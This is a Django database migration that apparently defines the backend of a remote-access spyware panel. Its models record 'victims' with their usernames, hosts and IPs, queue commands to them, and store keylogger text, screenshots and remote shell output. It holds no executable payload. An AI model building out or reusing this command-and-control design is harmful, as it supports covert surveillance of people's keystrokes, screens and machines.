# -*- coding: utf-8 -*-
# Generated by Django 1.9.4 on 2016-05-05 23:40
from __future__ import unicode_literals

from django.db import migrations, models
import django.db.models.deletion


class Migration(migrations.Migration):

    initial = True

    dependencies = [
    ]

    operations = [
        migrations.CreateModel(
            name='Client',
            fields=[
                ('id_client', models.AutoField(primary_key=True, serialize=False)),
                ('hostname', models.CharField(max_length=100, verbose_name='Host du victime, ordinator name')),
                ('dateajout', models.DateTimeField(auto_now_add=True, verbose_name="Date d'ajout")),
                ('connecte', models.BooleanField(default=True)),
                ('actif', models.BooleanField(default=True)),
                ('vue', models.BooleanField(default=False)),
                ('ville', models.CharField(default='Inconnue', max_length=100, verbose_name='Ville')),
                ('date_der_acces', models.DateTimeField(auto_now_add=True, verbose_name="Date d'ajout")),
                ('USERDOMAIN', models.CharField(max_length=100, verbose_name='Domain utilisateur ')),
                ('USERNAME', models.CharField(max_length=100, verbose_name="Nom de l'utilisateur ")),
                ('PROCESSOR_IDENTIFIER', models.CharField(max_length=100, verbose_name='Processeur ')),
                ('PROCESSOR_REVISION', models.CharField(max_length=100, verbose_name='Revision processeur ')),
                ('PROCESSOR_ARCHITECTURE', models.CharField(max_length=100, verbose_name='Architecture ')),
                ('NUMBER_OF_PROCESSORS', models.IntegerField(default=-1, verbose_name='Nombre de processeurs')),
                ('processor_level', models.IntegerField(default=-1, verbose_name='processor level')),
                ('syetem', models.CharField(max_length=100, verbose_name="Syst\xe8me d'exploitation")),
            ],
            options={
                'verbose_name': 'Client Victim',
                'verbose_name_plural': 'Clients victimes',
            },
        ),
        migrations.CreateModel(
            name='ClientCommande',
            fields=[
                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('executee', models.BooleanField(default=False, verbose_name='Ex\xe9cut\xe9e')),
                ('date_affectation', models.DateTimeField(auto_now_add=True, verbose_name='Date affactationa')),
                ('client', models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, to='serviceapp.Client')),
            ],
            options={
                'verbose_name': 'Client Commande',
                'verbose_name_plural': 'Clients Commandes',
            },
        ),
        migrations.CreateModel(
            name='Commande',
            fields=[
                ('id_cmd', models.AutoField(primary_key=True, serialize=False)),
                ('titre', models.CharField(max_length=200, verbose_name='Titre du commande')),
                ('active', models.BooleanField(default=True, verbose_name='Active')),
                ('texte', models.TextField(blank=True, null=True, verbose_name='Texte du commande')),
                ('date_ajout', models.DateTimeField(auto_now_add=True, verbose_name="Date d'ajout")),
                ('date_debut', models.DateTimeField(blank=True, null=True, verbose_name='Date debut')),
                ('date_fin', models.DateTimeField(blank=True, null=True, verbose_name='Date fin')),
                ('duree', models.DateTimeField(blank=True, null=True, verbose_name='Duree')),
                ('url', models.TextField(blank=True, null=True, verbose_name='Url du commande')),
                ('clients', models.ManyToManyField(through='serviceapp.ClientCommande', to='serviceapp.Client')),
            ],
        ),
        migrations.CreateModel(
            name='Continent',
            fields=[
                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('nom', models.CharField(max_length=100, verbose_name='Zone:\u0627\u0644\u0642\u0627\u0631\u0629')),
            ],
        ),
        migrations.CreateModel(
            name='IpAdresse',
            fields=[
                ('id_ip', models.AutoField(primary_key=True, serialize=False)),
                ('ip_locale', models.CharField(blank=True, max_length=50, null=True, verbose_name='IP locale')),
                ('ip_recue', models.CharField(blank=True, max_length=50, null=True, verbose_name='IP re\xe7ue, ordinator name')),
                ('ip_inter', models.CharField(blank=True, max_length=50, null=True, verbose_name='IP publique')),
                ('date_ajout', models.DateTimeField(auto_now_add=True, verbose_name="Date d'ajout")),
            ],
        ),
        migrations.CreateModel(
            name='KeyLoggerExecution',
            fields=[
                ('id_ae', models.AutoField(primary_key=True, serialize=False)),
                ('date_insertion_ae', models.DateTimeField(auto_now_add=True, verbose_name='Date insertion')),
                ('vue', models.BooleanField(default=False)),
                ('text_ke', models.TextField(verbose_name='Texte de message')),
                ('client_commande_ae', models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, to='serviceapp.ClientCommande')),
            ],
            options={
                'verbose_name': 'Keylogger execution',
                'verbose_name_plural': 'Keylogger executions',
            },
        ),
        migrations.CreateModel(
            name='Pays',
            fields=[
                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('nom', models.CharField(max_length=100, verbose_name='Pays:\u0627\u0644\u062f\u0648\u0644\u0629')),
                ('continent', models.ForeignKey(blank=True, null=True, on_delete=django.db.models.deletion.SET_NULL, to='serviceapp.Continent', verbose_name='Zone:\u0627\u0644\u0642\u0627\u0631\u0629')),
            ],
            options={
                'verbose_name': 'Pays',
                'verbose_name_plural': 'Pays',
            },
        ),
        migrations.CreateModel(
            name='ScreenShotExecution',
            fields=[
                ('id_ae', models.AutoField(primary_key=True, serialize=False)),
                ('date_insertion_ae', models.DateTimeField(auto_now_add=True, verbose_name='Date insertion')),
                ('vue', models.BooleanField(default=False)),
                ('img_sse', models.ImageField(max_length=2000, upload_to='screenshot/%Y/%m/%d/')),
                ('client_commande_ae', models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, to='serviceapp.ClientCommande')),
            ],
            options={
                'verbose_name': 'Screenshot execution',
                'verbose_name_plural': 'Sceenshot executions',
            },
        ),
        migrations.CreateModel(
            name='ShellExecution',
            fields=[
                ('id_ae', models.AutoField(primary_key=True, serialize=False)),
                ('date_insertion_ae', models.DateTimeField(auto_now_add=True, verbose_name='Date insertion')),
                ('vue', models.BooleanField(default=False)),
                ('resultats', models.TextField(blank=True, null=True, verbose_name='Resultats')),
                ('client_commande_ae', models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, to='serviceapp.ClientCommande')),
            ],
            options={
                'verbose_name': 'Shell execution',
                'verbose_name_plural': 'Shell executions',
            },
        ),
        migrations.CreateModel(
            name='TypeCommande',
            fields=[
                ('nom', models.CharField(max_length=100, primary_key=True, serialize=False, verbose_name='type')),
            ],
        ),
        migrations.AddField(
            model_name='commande',
            name='type_cmd',
            field=models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, to='serviceapp.TypeCommande', verbose_name='Type commande'),
        ),
        migrations.AddField(
            model_name='clientcommande',
            name='commande',
            field=models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, to='serviceapp.Commande'),
        ),
        migrations.AddField(
            model_name='client',
            name='commandes',
            field=models.ManyToManyField(through='serviceapp.ClientCommande', to='serviceapp.Commande'),
        ),
        migrations.AddField(
            model_name='client',
            name='ipadresse',
            field=models.ForeignKey(blank=True, null=True, on_delete=django.db.models.deletion.SET_NULL, to='serviceapp.IpAdresse', verbose_name='IP'),
        ),
        migrations.AddField(
            model_name='client',
            name='pays',
            field=models.ForeignKey(blank=True, null=True, on_delete=django.db.models.deletion.SET_NULL, to='serviceapp.Pays', verbose_name='Pays'),
        ),
        migrations.AlterUniqueTogether(
            name='clientcommande',
            unique_together=set([('client', 'commande')]),
        ),
    ]
